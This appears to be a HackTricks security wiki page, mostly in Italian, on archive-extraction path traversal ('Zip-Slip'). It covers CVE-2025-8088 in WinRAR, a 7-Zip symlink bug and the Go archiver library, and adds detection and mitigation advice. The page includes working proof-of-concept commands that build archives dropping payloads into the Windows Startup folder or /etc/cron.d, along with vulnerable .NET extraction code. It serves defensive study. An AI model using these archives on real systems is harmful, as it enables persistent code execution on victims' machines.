# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Panoramica

Molti formati di archivio (ZIP, RAR, TAR, 7-ZIP, ecc.) permettono a ciascuna voce di avere il proprio **internal path**. Quando un'utilità di estrazione si limita a rispettare acriticamente quel percorso, un nome file creato ad arte contenente `..` o un **absolute path** (es. `C:\Windows\System32\`) verrà scritto al di fuori della directory scelta dall'utente.
Questa classe di vulnerabilità è ampiamente conosciuta come *Zip-Slip* o **archive extraction path traversal**.

Le conseguenze variano dalla sovrascrittura di file arbitrari fino all'ottenimento diretto di **remote code execution (RCE)** posizionando un payload in una posizione **auto-run** come la cartella *Startup* di Windows.

## Causa principale

1. L'attaccante crea un archivio dove uno o più header di file contengono:
* Sequenze di traversal relative (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Percorsi assoluti (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* O **symlinks** creati appositamente che risolvono al di fuori della directory di destinazione (comuni in ZIP/TAR su *nix*).
2. La vittima estrae l'archivio con uno strumento vulnerabile che si fida del percorso incorporato (o segue gli **symlinks**) invece di sanificarlo o forzare l'estrazione sotto la directory scelta.
3. Il file viene scritto nella posizione controllata dall'attaccante ed eseguito/caricato la volta successiva in cui il sistema o l'utente attiva quel percorso.

### .NET `Path.Combine` + `ZipArchive` traversal

Un anti-pattern comune in .NET è combinare la destinazione prevista con il `ZipArchiveEntry.FullName` **user-controlled** ed estrarre senza normalizzare il percorso:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Se `entry.FullName` inizia con `..\\` permette traversal; se è un **absolute path** la componente di sinistra viene scartata completamente, generando una **arbitrary file write** come identità dell'estrazione.
- Archivio proof-of-concept per scrivere in una directory `app` sorella monitorata da uno scanner schedulato:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Dropping that ZIP into the monitored inbox results in `C:\samples\app\0xdf.txt`, proving traversal outside `C:\samples\queue\` and enabling follow-on primitives (e.g., DLL hijacks).

## Esempio reale – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR for Windows (including the `rar` / `unrar` CLI, the DLL and the portable source) non validava i nomi dei file durante l'estrazione.
Un archivio RAR malevolo contenente una voce come:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
si ritroverebbe **fuori** dalla directory di output selezionata e all'interno della cartella *Startup* dell'utente. Dopo l'accesso, Windows esegue automaticamente tutto ciò che è presente lì, garantendo RCE *persistente*.

### Creazione di un archivio PoC (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Options used:
* `-ep`  – store file paths exactly as given (do **not** prune leading `./`).

Consegna `evil.rar` alla vittima e istruiscila a estrarlo con una build vulnerabile di WinRAR.

### Sfruttamento osservato nel mondo reale

ESET ha segnalato campagne di spear-phishing di RomCom (Storm-0978/UNC2596) che allegavano archivi RAR sfruttando CVE-2025-8088 per distribuire backdoor personalizzate e facilitare operazioni di ransomware.

## Casi più recenti (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: ZIP entries that are **symbolic links** were dereferenced during extraction, letting attackers escape the destination directory and overwrite arbitrary paths. User interaction is just *opening/extracting* the archive.
* **Interessati**: 7-Zip 21.02–24.09 (Windows & Linux builds). Fixed in **25.00** (July 2025) and later.
* **Percorso d'impatto**: Overwrite `Start Menu/Programs/Startup` or service-run locations → code runs at next logon or service restart.
* **PoC rapido (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
On a patched build `/etc/cron.d` won’t be touched; the symlink is extracted as a link inside /tmp/target.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` follows `../` and symlinked ZIP entries, writing outside `outputDir`.
* **Interessati**: `github.com/mholt/archiver` ≤ 3.5.1 (project now deprecated).
* **Fix**: Switch to `mholt/archives` ≥ 0.1.0 or implement canonical-path checks before write.
* **Riproduzione minima**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Suggerimenti di rilevamento

* **Ispezione statica** – Elenca le voci dell'archivio e segnala qualsiasi nome contenente `../`, `..\\`, *absolute paths* (`/`, `C:`) o entries of type *symlink* whose target is outside the extraction dir.
* **Canonicalisation** – Ensure `realpath(join(dest, name))` still starts with `dest`. Reject otherwise.
* **Sandbox extraction** – Decompress into a disposable directory using a *safe* extractor (e.g., `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) and verify resulting paths stay inside the directory.
* **Monitoraggio endpoint** – Alert on new executables written to `Startup`/`Run`/`cron` locations shortly after an archive is opened by WinRAR/7-Zip/etc.

## Mitigazione e hardening

1. **Aggiorna l'estrattore** – WinRAR 7.13+ e 7-Zip 25.00+ implementano path/symlink sanitisation. Entrambi gli strumenti ancora non dispongono di auto-update.
2. Estrai gli archivi con “**Do not extract paths**” / “**Ignore paths**” quando possibile.
3. Su Unix, abbassa i privilegi & monta un **chroot/namespace** prima dell'estrazione; su Windows, usa **AppContainer** o una sandbox.
4. Se scrivi codice custom, normalizza con `realpath()`/`PathCanonicalize()` **prima** di create/write, e rifiuta qualsiasi entry che escapes the destination.

## Altri casi interessati / Storici

* 2018 – Massive *Zip-Slip* advisory by Snyk affecting many Java/Go/JS libraries.
* 2023 – 7-Zip CVE-2023-4011 similar traversal during `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal in slugs (patch in v1.2).
* Any custom extraction logic that fails to call `PathCanonicalize` / `realpath` prior to write.

## Riferimenti

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
